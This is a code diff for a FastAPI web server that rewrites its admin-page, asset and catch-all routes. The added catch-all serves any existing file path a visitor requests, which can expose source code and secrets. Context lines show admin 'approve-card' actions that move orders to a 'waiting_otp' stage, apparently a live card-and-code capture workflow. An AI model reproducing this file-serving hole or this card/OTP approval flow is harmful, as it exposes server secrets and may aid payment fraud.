@@ -1,26 +1,23 @@
 import os
 import json
+import asyncio
 import logging
 import uuid
 from datetime import datetime
 from typing import List, Optional
-from pathlib import Path
-
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Depends, Header, Request
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse, JSONResponse
 from pydantic import BaseModel
 import databases
 import sqlalchemy
+from passlib.context import CryptContext
 from jose import JWTError, jwt
 
 # Setup logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("server")
-
-# Get the directory where server.py is located
-BASE_DIR = Path(__file__).resolve().parent
 
 # Configuration
 DATABASE_URL = os.getenv("DATABASE_URL")
@@ -139,10 +136,6 @@ async def get_current_admin(authorization: str = Header(None)):
 @app.on_event("startup")
 async def startup():
     await database.connect()
-    # Log the base directory
-    logger.info(f"Base directory: {BASE_DIR}")
-    logger.info(f"Assets directory exists: {(BASE_DIR / 'assets').exists()}")
-    logger.info(f"Index.html exists: {(BASE_DIR / 'index.html').exists()}")
 
 @app.on_event("shutdown")
 async def shutdown():
@@ -213,6 +206,7 @@ async def get_all_orders(admin: str = Depends(get_current_admin)):
     rows = await database.fetch_all(query)
     return [dict(row) for row in rows]
 
+# Admin Action Routes
 @app.post("/api/admin/orders/{ref}/approve-card")
 async def approve_card(ref: str, admin: str = Depends(get_current_admin)):
     query = orders.update().where(orders.c.order_ref == ref).values(status="waiting_otp", stage="otp")
@@ -259,37 +253,62 @@ async def websocket_endpoint(websocket: WebSocket):
     except WebSocketDisconnect:
         manager.disconnect(websocket)
 
-# Mount assets BEFORE catch-all route
-assets_dir = BASE_DIR / "assets"
-if assets_dir.exists():
-    logger.info(f"Mounting assets from: {assets_dir}")
-    app.mount("/assets", StaticFiles(directory=str(assets_dir)), name="assets")
-else:
-    logger.warning(f"Assets directory not found at: {assets_dir}")
-
-# Serve admin page
+# Serve Admin Page
 @app.get("/admin")
-async def serve_admin():
-    admin_file = BASE_DIR / "admin.html"
-    if admin_file.exists():
-        return FileResponse(str(admin_file))
+async def read_admin():
+    admin_path = os.path.join(os.path.dirname(__file__), "admin.html")
+    if os.path.exists(admin_path):
+        return FileResponse(admin_path)
     raise HTTPException(status_code=404, detail="Admin page not found")
 
-# Catch-all route for SPA
+# Mount assets directory with priority
+assets_path = os.path.join(os.path.dirname(__file__), "assets")
+if os.path.exists(assets_path):
+    logger.info(f"Mounting assets from: {assets_path}")
+    app.mount("/assets", StaticFiles(directory=assets_path), name="assets")
+else:
+    logger.warning(f"Assets directory not found at: {assets_path}")
+
+# Catch-all route for SPA and Assets
 @app.get("/{path_name:path}")
-async def catch_all(path_name: str):
-    logger.info(f"Catch-all route: {path_name}")
+async def catch_all(request: Request, path_name: str):
+    logger.info(f"Catch-all request for: {path_name}")
     
-    # Don't handle API routes
+    # 1. Check if the path is an API route
     if path_name.startswith("api/"):
-        raise HTTPException(status_code=404, detail="API not found")
+        raise HTTPException(status_code=404, detail="API route not found")
     
-    # Serve index.html for all other routes (SPA routing)
-    index_file = BASE_DIR / "index.html"
-    if index_file.exists():
-        return FileResponse(str(index_file))
+    # 2. Check if it's a WebSocket request
+    if path_name == "ws":
+        raise HTTPException(status_code=404, detail="WebSocket not found")
+        
+    # 3. Check if the file exists directly in the root
+    if os.path.isfile(path_name):
+        return FileResponse(path_name)
     
-    raise HTTPException(status_code=404, detail="Not found")
+    # 4. Handle assets that might be requested without /assets/ prefix
+    # or handle cases where they are requested with /assets/ but mount failed
+    if path_name.startswith("assets/"):
+        asset_path = path_name
+        if os.path.isfile(asset_path):
+            return FileResponse(asset_path)
+    
+    # 5. If it's a request for a file with an extension but not found
+    if "." in path_name.split("/")[-1]:
+        # Try searching for the file in assets directory
+        potential_asset = os.path.join("assets", path_name.split("/")[-1])
+        if os.path.isfile(potential_asset):
+            return FileResponse(potential_asset)
+        
+        logger.warning(f"File not found: {path_name}")
+        return JSONResponse(status_code=404, content={"detail": "Not found"})
+    
+    # 6. Default to index.html for SPA routing
+    index_path = os.path.join(os.path.dirname(__file__), "index.html")
+    if os.path.exists(index_path):
+        return FileResponse(index_path)
+    
+    raise HTTPException(status_code=404, detail="Page not found")
 
 if __name__ == "__main__":
     import uvicorn
